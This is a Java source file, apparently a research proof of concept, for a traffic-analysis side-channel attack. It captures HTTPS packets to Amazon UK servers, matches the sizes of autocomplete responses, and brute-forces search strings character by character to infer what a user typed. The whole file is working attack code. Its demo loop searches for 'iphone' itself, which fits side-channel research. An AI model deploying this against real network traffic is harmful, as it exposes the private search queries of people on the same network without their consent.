package com.alexsebbe.notused;

import java.io.IOException;
import java.security.KeyManagementException;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.List;

import org.pcap4j.core.PcapNetworkInterface;
import org.pcap4j.util.NifSelector;

import com.alexsebbe.interceptor.AmazonUKProperties;
import com.alexsebbe.interceptor.ChunkedSnifferRunner;
import com.alexsebbe.interceptor.WebRequestEmulator;

public class OnTheFlyInterceptor {
	WebRequestEmulator emulator;
	ChunkedSnifferRunner snifferRunner;
	
	public static void main(String[] args) {
		OnTheFlyInterceptor onTheFlyInterceptor = new OnTheFlyInterceptor();
		onTheFlyInterceptor.run("abcdefghijklmnopqrstuvwxyz");
	}
	
	public void run(String alternativesString) {
		// Decide what interface to use
    	PcapNetworkInterface nif;
		try {
			nif = new NifSelector().selectNetworkInterface();
		} catch (IOException e) {
			e.printStackTrace();
			return;
		}

		if (nif == null) {
			return;
		}
		
		// Initialize the emulator
		emulator = new WebRequestEmulator();
    
    	try {
			emulator.initialize();
		} catch (KeyManagementException e1) {
			e1.printStackTrace();
		} catch (NoSuchAlgorithmException e1) {
			e1.printStackTrace();
		} catch (KeyStoreException e1) {
			e1.printStackTrace();
		}
		
		snifferRunner = new ChunkedSnifferRunner(nif, AmazonUKProperties.INSTANCE.getIPAddresses(), 443);
		// Start sniffer thread
		Thread snifferThread = new Thread(snifferRunner);
		snifferThread.start();
		int i = 0;
		List<String> currentState = new ArrayList<String>();
		while(true) {
			snifferRunner.startNextIteration();
			try {
				String searchString = "i";
				if(i==1) {
					searchString = "ip";
				} else if(i==2) {
					searchString = "iph";
				} else if(i==3) {
					searchString = "ipho";
				} else if(i==4) {
					searchString = "iphon";
				} else if(i==5) {
					searchString = "iphone";
				}
				emulator.doSearch(searchString, AmazonUKProperties.INSTANCE);
			} catch (IOException e1) {
				e1.printStackTrace();
			}	
			if(!snifferRunner.waitForPacketsToBeReceived(30000)) {
				System.out.println("I have now waited for " + 30000/(60000) + " minutes, "
						+ "there seems to be no packets coming in. Are you sure you have configured me correctly?");
				continue;
			}
			
			List<Integer> currLengths = snifferRunner.getCurrentPacketsSizes();
			// The first captures is filled with unrelated packets. Keep only the last one which is the autocomplete response
			Integer targetLength = currLengths.get(currLengths.size()-1);
			System.out.println("Calculating your query... ");
			long time = System.currentTimeMillis();
			try {
				currentState = findPossibleSolutions(currentState, targetLength, alternativesString);
				System.out.println("Calculation done. It took " + (System.currentTimeMillis() - time)/1000.0 + " seconds \nMy guess is that you have written one of the following inputs: ");
				for(String s : currentState) {
					System.out.println(s);
				}
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			
			i++;
			if(i == 6) {
				break;
			}
		}
	}
	
	private List<String> findPossibleSolutions(List<String> previousStates, int targetLength, String alternativesString) throws IOException {
		if(previousStates.isEmpty()) {
			previousStates.add("");
		}
		List<String> result = new ArrayList<String>();
		for(String state : previousStates) {
			for(char c : alternativesString.toCharArray()) {
				String searchString = state+c;
				snifferRunner.startNextIteration();
	    		String response = emulator.doSearch(searchString, AmazonUKProperties.INSTANCE);
	    		//System.out.println(response);
	    		while(!snifferRunner.waitForPacketsToBeReceived(100000)) {
	        		System.out.println("Timed out while waiting for packet to be captured. Trying again! "
	        				+ "Current search string '"+searchString+"'");
	        		response = emulator.doSearch(searchString, AmazonUKProperties.INSTANCE);
	        	}
	    		if(AmazonUKProperties.INSTANCE.isNoResultResponse(response, searchString)) {
	    			continue;
	    		}
	    		int currentPacketSize = snifferRunner.getCurrentPacketsSizes().get(
	    					snifferRunner.getCurrentPacketsSizes().size()-1);
	    		//System.out.println("Curr: " + currentPacketSize + " Target: " + targetLength);
	    		if(currentPacketSize == targetLength) {
	    			result.add(searchString);
	    		}
	    		
			}
		}
		return result;
	}


}
